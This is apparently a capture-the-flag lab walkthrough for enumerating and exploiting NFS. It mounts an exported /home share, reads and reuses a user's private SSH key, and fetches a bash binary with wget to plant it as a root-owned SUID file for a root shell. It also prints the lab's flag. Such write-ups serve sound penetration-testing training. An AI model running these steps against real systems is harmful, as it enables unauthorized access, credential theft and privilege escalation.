# NFS Enumeration & Exploitation Walkthrough

## 🔍 What is Enumeration?

> "Enumeration is a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system."  
> — [Infosec Institute](https://resources.infosecinstitute.com/what-is-enumeration/)

Enumeration is a **crucial phase** in penetration testing, where all valuable information for attacks is uncovered.

---

## 📡 Enumerating NFS

### 🔎 Nmap Scan

Start with an aggressive full-port scan:

```bash
sudo nmap -A -p- -Pn -vv <ip>
```

⏱️ This can be slow; optimize with:

```bash
sudo nmap -sV -p- -Pn -vv --min-rate=1000 <ip>
```

Then focus on likely ports:

```bash
nmap -sV -sT -p 111,2049 --script=rpcinfo <ip> -Pn
```

- **Answer:** 7 open ports (even though 8 were initially seen)

#### 🧩 Which port hosts the service?

- **Port 2049** is for NFS (Network File System).

---

### 🗂️ Listing NFS Shares

```bash
showmount -e <ip>
```

- **Found share:** `/home`

---

### 📦 Mounting the Share

```bash
mkdir /tmp/mount
sudo mount -t nfs <ip>:/home /tmp/mount -nolock
cd /tmp/mount
ls
```

- **Found directory:** `cappucino`

---

## 🔐 SSH Key Discovery

Inside the `cappucino` folder:

```bash
cd cappucino
ls -a
```

- **Found:** `.ssh` directory (private keys reside here)

**Most useful key:**

```bash
cat .ssh/id_rsa
cat .ssh/id_rsa.pub
```

- 🔑 **Key file:** `id_rsa`
- 👤 **User** is extractable from `.pub` file

#### Local Key Setup

```bash
cp id_rsa ~/Downloads/
chmod 600 ~/Downloads/id_rsa
```

#### SSH Login

```bash
ssh -i ~/Downloads/id_rsa cappucino@<ip>
```

- ✅ **Access gained**

---

## 🧨 Exploiting NFS – Gaining Root

The plan: Upload a modified bash binary with **SUID permissions**.

### ⬇️ Download and Prepare Bash

```bash
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash -O ~/Downloads/bash
cp ~/Downloads/bash /tmp/mount/cappucino
cd /tmp/mount/cappucino
```

### 🛡️ Set Permissions

```bash
sudo chown root bash
sudo chmod u+s bash
ls -l bash
```

- ✅ Should show: `-rwsr-sr-x`

---

## 🧑‍💻 Final Exploit

Back in the remote shell:

```bash
ssh -i ~/Downloads/id_rsa cappucino@<ip>
cd ~
./bash -p
```

- 🎉 **Root shell achieved!**

---

## 🏁 Root Flag

```bash
cat /root/root.txt
```

- 🏴 `THM{nfs_got_pwned}`

---
